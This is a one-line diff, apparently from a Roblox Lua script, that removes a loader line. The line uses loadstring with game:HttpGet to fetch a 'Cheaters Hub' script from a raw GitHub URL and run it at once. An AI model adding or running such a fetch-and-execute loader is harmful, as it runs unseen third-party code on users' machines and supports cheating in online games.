@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Steveee11/Scripts/main/Cheaters%20Hub",true))();
